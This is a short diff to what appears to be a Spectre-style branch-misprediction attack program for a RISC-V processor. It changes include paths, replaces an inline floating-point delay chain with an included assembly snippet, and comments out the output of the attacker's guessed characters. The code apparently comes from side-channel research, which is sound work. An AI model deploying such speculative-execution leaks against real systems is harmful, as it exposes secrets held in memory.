@@ -1,7 +1,7 @@
 #include <stdio.h>
 #include <stdint.h> 
-#include "encoding.h"
-#include "cache.h"
+#include "../inc/encoding.h"
+#include "../inc/cache.h"
 
 #define TRAIN_TIMES 40 // assumption is that you have a 3 bit counter in the predictor
 #define ATTACK_SAME_ROUNDS 10
@@ -58,15 +58,7 @@ int main(void){
                     // this calls the function using jalr and delays the addr passed in through fdiv
                     asm volatile(
                         "addi %[addr], %[addr], -2\n"
-                        "addi t1, zero, 2\n"
-                        "slli t2, t1, 0x4\n"
-                        "fcvt.s.lu fa4, t1\n"
-                        "fcvt.s.lu fa5, t2\n"
-                        "fdiv.s	fa5, fa5, fa4\n"
-                        "fdiv.s	fa5, fa5, fa4\n"
-                        "fdiv.s	fa5, fa5, fa4\n"
-                        "fdiv.s	fa5, fa5, fa4\n"
-                        "fcvt.lu.s	t2, fa5, rtz\n"
+                        ".include \"snippet.s\"\n" // Include the external assembly snippet
                         "add %[addr], %[addr], t2\n"
                         "jalr ra, %[addr], 0\n"
                         :
@@ -90,7 +82,7 @@ int main(void){
                 max = results[i];
                 index = i;
             }
-        printf("The attacker guessed character %c %ld times.\n", index, max);  
+        //printf("The attacker guessed character %c %ld times.\n", index, max);  
         
         guessedSecret[i] = index;
         
